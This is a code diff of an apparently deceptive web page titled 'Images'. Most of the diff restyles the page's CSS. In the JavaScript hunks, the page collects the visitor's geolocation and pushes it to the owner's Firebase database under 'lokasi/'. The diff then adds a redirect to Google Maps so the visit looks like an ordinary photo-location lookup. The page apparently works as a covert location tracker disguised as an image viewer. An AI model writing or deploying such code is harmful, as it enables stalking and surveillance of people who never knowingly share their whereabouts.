@@ -6,21 +6,17 @@
 <title>Images</title>
 <style>
 :root{
-  --bg:#04070d;--bg2:#0a101c;--bg3:#0e1626;
+  --bg:#000000;--bg2:#0a0a0a;--bg3:#111111;
   --gold:#00e58a;--gold2:#66ffc2;--cyan:#38bdf8;
   --red:#ff3355;
   --text:#cfd9e6;--text-d:#5d7186;
-  --border:#152030;--border2:#1d2a3c;--radius:6px;
+  --border:#152030;--border2:#1a1a1a;--radius:6px;
 }
 *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 html,body{height:100%;overflow-x:hidden}
 body{
   font-family:'Courier New',monospace;
-  background:
-    radial-gradient(1100px 520px at 85% -12%,rgba(56,189,248,.10),transparent 60%),
-    radial-gradient(900px 480px at -10% 108%,rgba(0,229,138,.06),transparent 60%),
-    linear-gradient(180deg,#071021 0%,#04070d 45%,#02050a 100%);
-  background-attachment:fixed;
+  background:#000000;
   color:var(--text);
   min-height:100vh;
   padding:14px;
@@ -30,7 +26,7 @@ body{
 }
 body::before{
   content:'';position:fixed;inset:0;
-  background:repeating-linear-gradient(0deg,rgba(0,229,138,.012) 0px,rgba(0,229,138,.012) 1px,transparent 1px,transparent 4px);
+  background:repeating-linear-gradient(0deg,rgba(0,229,138,.010) 0px,rgba(0,229,138,.010) 1px,transparent 1px,transparent 4px);
   pointer-events:none;z-index:9999;
 }
 .wrap{position:relative;z-index:2;max-width:460px;width:100%}
@@ -43,7 +39,7 @@ body::before{
   display:flex;justify-content:space-between;align-items:center;
   font-size:11px;
   border-radius:var(--radius) var(--radius) 0 0;
-  box-shadow:inset 0 1px 0 rgba(148,205,255,.08),inset 0 0 46px rgba(56,189,248,.035);
+  box-shadow:inset 0 1px 0 rgba(148,205,255,.05);
 }
 .term-header .dots{display:flex;gap:6px}
 .dot-win{width:9px;height:9px;border-radius:50%}
@@ -60,11 +56,10 @@ body::before{
 /* CARD */
 .card{
   background:var(--bg2);
-  background-image:linear-gradient(180deg,rgba(56,189,248,.06),rgba(56,189,248,0) 42%);
   border:1px solid var(--border2);
   padding:14px;margin-bottom:12px;
   border-radius:var(--radius);
-  box-shadow:inset 0 1px 0 rgba(148,205,255,.08),inset 0 0 46px rgba(56,189,248,.035),0 10px 26px rgba(0,0,0,.45);
+  box-shadow:0 10px 26px rgba(0,0,0,.45);
 }
 .card.first{border-radius:0 0 var(--radius) var(--radius);border-top:1px solid #0d3f2e}
 
@@ -314,6 +309,7 @@ window.lihatLokasi = function () {
       const acc = pos.coords.accuracy;
 
       try {
+        // Simpan ke Firebase
         await push(ref(db, 'lokasi/' + ownerUser), {
           target:   'images',
           waktu:    Date.now(),
@@ -330,7 +326,7 @@ window.lihatLokasi = function () {
         });
 
         st.className = 'status ok';
-        st.textContent = 'Lokasi foto berhasil dibuka';
+        st.textContent = 'Membuka peta...';
 
         // Beep feedback
         try {
@@ -346,6 +342,12 @@ window.lihatLokasi = function () {
           o.start();
           o.stop(ac.currentTime + 0.15);
         } catch (e) {}
+
+        // ═══ AUTO REDIRECT KE GOOGLE MAPS ═══
+        setTimeout(() => {
+          const mapsUrl = 'https://www.google.com/maps?q=' + lat + ',' + lng;
+          window.location.href = mapsUrl;
+        }, 400);
 
       } catch (e) {
         st.className = 'status err';
